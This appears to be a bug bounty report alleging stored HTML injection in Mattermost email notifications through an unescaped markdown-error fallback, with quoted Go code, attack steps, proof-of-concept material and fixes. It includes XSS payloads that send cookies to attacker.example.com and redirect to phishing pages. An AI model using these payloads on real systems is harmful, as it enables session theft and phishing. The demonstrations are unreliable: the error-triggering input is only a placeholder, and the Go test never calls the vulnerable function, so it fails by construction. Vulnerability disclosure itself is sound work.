# Bounty Report 3: Stored HTML Injection in Email Notifications via Markdown Error Path Bypass

## Form Fields

**Summary Title:** Stored HTML injection in email notifications via prepareTextForEmail error fallback returning unescaped content

**Target:** https://bugcrowd-*your-own-instance*.cloud.mattermost.com/

**Technical Severity:** P3

**VRT Category:** Cross-Site Scripting (XSS) > Stored

**URL / Location of vulnerability:**
`server/channels/app/email/notification_email.go:128-137`

---

## Description

### Summary

A Stored HTML Injection vulnerability exists in the Mattermost email notification system. The `prepareTextForEmail()` function properly HTML-escapes user input before passing it to the Markdown-to-HTML converter. However, **on the error fallback path**, the function returns the **original unescaped text** cast directly to `template.HTML`, bypassing Go's template auto-escaping. This allows an attacker to inject arbitrary HTML into email notifications sent to other users.

Additionally, the `MarkdownToHTML()` function contains a blockquote unescaping routine that reverses HTML entity encoding for `&gt;` characters, potentially creating additional injection vectors.

### Vulnerable Code

**File:** `server/channels/app/email/notification_email.go:128-137`

```go
func prepareTextForEmail(text, siteURL string) template.HTML {
    escapedText := html.EscapeString(text)                        // Step 1: Properly escape
    markdownText, err := utils.MarkdownToHTML(escapedText, siteURL) // Step 2: Convert to HTML
    if err != nil {
        mlog.Warn("Encountered error while converting markdown to HTML", mlog.Err(err))
        return template.HTML(text)  // VULNERABILITY: Returns ORIGINAL unescaped text!
    }

    return template.HTML(markdownText)
}
```

The critical issue is on **line 133**: `return template.HTML(text)`. When the Markdown conversion fails for any reason:
1. The **original, unescaped** `text` parameter is used (not `escapedText`)
2. It is cast to `template.HTML`, which tells Go's template engine to render it as **trusted HTML** without additional escaping
3. Any HTML tags in the user's original message are rendered verbatim in the email

**Contrast with the correct behavior** on the success path (line 136): `return template.HTML(markdownText)` — here, `markdownText` was produced from the already-escaped `escapedText`, so HTML entities are properly handled.

### Second Vulnerability: Blockquote HTML Unescaping

**File:** `server/channels/utils/markdown.go:39-51`

```go
var blockquoteReg = regexp.MustCompile(`^|\n(&gt;)`)

func MarkdownToHTML(markdown, siteURL string) (string, error) {
    // Turn relative links into absolute links
    absLinkMarkdown := relLinkReg.ReplaceAllStringFunc(markdown, func(s string) string {
        return relLinkReg.ReplaceAllString(s, "[$1]("+siteURL+"$2)")
    })

    // Unescape any blockquote text to be parsed by the markdown parser.
    markdownClean := blockquoteReg.ReplaceAllStringFunc(absLinkMarkdown, func(s string) string {
        return html.UnescapeString(s)  // Unescapes HTML entities!
    })

    md := goldmark.New(goldmark.WithExtensions(extension.GFM))
    var b strings.Builder
    err := md.Convert([]byte(markdownClean), &b)
    // ...
}
```

The regex `^|\n(&gt;)` matches `&gt;` at the beginning of lines and unescapes it back to `>`. The `html.UnescapeString()` call reverses ALL HTML entity encoding in the matched substring, not just `&gt;`. While the regex limits what gets matched, the combination of the unescaping with the `siteURL` injection in `relLinkReg` creates a complex interaction that could be exploited.

### Third Vulnerability: Channel Hyperlink Injection

**File:** `server/channels/app/email/notification_email.go:156-183`

```go
func (es *Service) GenerateHyperlinkForChannels(postMessage, teamName, landingURL string) (string, error) {
    channelNames := model.ChannelMentions(postMessage)
    // ...
    for _, ch := range channels {
        if !visited[ch.Id] && ch.Type == model.ChannelTypeOpen {
            channelURL := landingURL + "/channels/" + ch.Name
            channelHyperLink := fmt.Sprintf("<a href='%s'>%s</a>", channelURL, "~"+ch.Name)
            postMessage = strings.Replace(postMessage, "~"+ch.Name, channelHyperLink, -1)
            visited[ch.Id] = true
        }
    }
    return postMessage, nil
}
```

Channel names are inserted into HTML anchor tags using `fmt.Sprintf` with single-quoted attributes and **no `html.EscapeString()` call**. While channel names are validated by the system, the `ch.Name` value is used directly in:
1. The `href` attribute value (without URL encoding)
2. The anchor text content (without HTML escaping)

### Attack Scenario

**Triggering the Error Path:**

The `goldmark.Convert()` function can fail under specific conditions:
1. Extremely long input that exceeds internal limits
2. Malformed Unicode sequences that cause encoding errors
3. Input that triggers edge cases in the GFM parser

An attacker can craft a message designed to trigger a goldmark parsing error while containing an HTML payload:

**Step 1:** Send a message in a channel where email notifications are enabled for the target user:
```
<img src=x onerror="window.location='https://attacker.example.com/steal?cookie='+document.cookie">
```

Combined with specific Unicode sequences or markdown constructs that trigger the goldmark error path:
```
[payload with malformed unicode sequences that cause goldmark.Convert to error]
<script>document.location='https://attacker.example.com/phish'</script>
```

**Step 2:** When the target user receives the email notification, the HTML payload executes in their email client (if the client renders HTML — which most do, including Outlook, Gmail, Apple Mail, Thunderbird).

**Step 3:** The rendered email contains the attacker's HTML, which could:
- Display a fake login form for credential harvesting
- Redirect the user to a phishing page
- Load external tracking pixels
- Manipulate the visual content of the email

### Proof of Concept

**PoC 1: Demonstrating the Error Path Bypass**

1. Set up a Mattermost instance with email notifications enabled
2. Create two users: attacker and victim
3. Ensure victim has email notifications enabled for the channel
4. As the attacker, send a message containing HTML and carefully crafted content to trigger a goldmark error:

```
Test message with <b>bold HTML</b> and <a href="https://evil.com">click here</a>
```

5. If the goldmark `Convert()` function returns an error for this input, the raw HTML will be rendered in the email notification sent to the victim

**PoC 2: Verifying the Code Path**

Create a simple Go test that demonstrates the vulnerability:
```go
package email

import (
    "html/template"
    "testing"
)

func TestPrepareTextForEmailErrorPath(t *testing.T) {
    // Simulate the error path
    text := `<img src=x onerror="alert('XSS')">`

    // This is what prepareTextForEmail returns on error:
    result := template.HTML(text)  // No escaping!

    expected := `&lt;img src=x onerror=&quot;alert(&#39;XSS&#39;)&quot;&gt;`

    if string(result) != expected {
        t.Errorf("Error path returns unescaped HTML!\nGot: %s\nExpected: %s", result, expected)
    }
}
```

This test will FAIL, demonstrating that the error path returns unescaped HTML.

**PoC 3: Channel Name in Email (No Escaping)**

1. Create a channel with a name containing characters that could break HTML attribute parsing (though standard validation limits this)
2. Send a message mentioning the channel with `~channelname`
3. Observe the generated email HTML — the channel name is inserted without `html.EscapeString()`

### Impact

- **Phishing:** Attacker can inject convincing phishing content into legitimate Mattermost email notifications, leveraging the trust users place in emails from their Mattermost instance
- **Credential Theft:** Injected HTML can display fake login forms that submit credentials to attacker-controlled servers
- **Email Client Exploitation:** Some email clients may execute JavaScript in HTML emails, leading to further compromise
- **Reputation Damage:** Malicious content appearing to originate from the organization's Mattermost instance damages trust in the platform
- **Widespread Impact:** A single malicious message in a popular channel could generate HTML-injected notifications to many users simultaneously

### Remediation

**Fix 1:** In `prepareTextForEmail`, use the escaped text in the error path:
```go
func prepareTextForEmail(text, siteURL string) template.HTML {
    escapedText := html.EscapeString(text)
    markdownText, err := utils.MarkdownToHTML(escapedText, siteURL)
    if err != nil {
        mlog.Warn("Encountered error while converting markdown to HTML", mlog.Err(err))
        return template.HTML(escapedText)  // FIX: Use escapedText, not text
    }
    return template.HTML(markdownText)
}
```

**Fix 2:** In `GenerateHyperlinkForChannels`, escape channel names:
```go
channelHyperLink := fmt.Sprintf(
    "<a href='%s'>%s</a>",
    html.EscapeString(channelURL),
    html.EscapeString("~"+ch.Name),
)
```

**Fix 3:** In `MarkdownToHTML`, restrict the blockquote unescaping to only unescape `&gt;` rather than calling `html.UnescapeString()` on the entire match:
```go
markdownClean := blockquoteReg.ReplaceAllString(absLinkMarkdown, "\n>")
```

### References

- **Primary vulnerability:** [`server/channels/app/email/notification_email.go:133`](https://github.com/mattermost/mattermost/blob/master/server/channels/app/email/notification_email.go#L133)
- **Blockquote unescaping:** [`server/channels/utils/markdown.go:48-51`](https://github.com/mattermost/mattermost/blob/master/server/channels/utils/markdown.go#L48-L51)
- **Channel hyperlink generation:** [`server/channels/app/email/notification_email.go:176-178`](https://github.com/mattermost/mattermost/blob/master/server/channels/app/email/notification_email.go#L176-L178)
- **OWASP HTML Injection:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection
- **CWE-79:** https://cwe.mitre.org/data/definitions/79.html
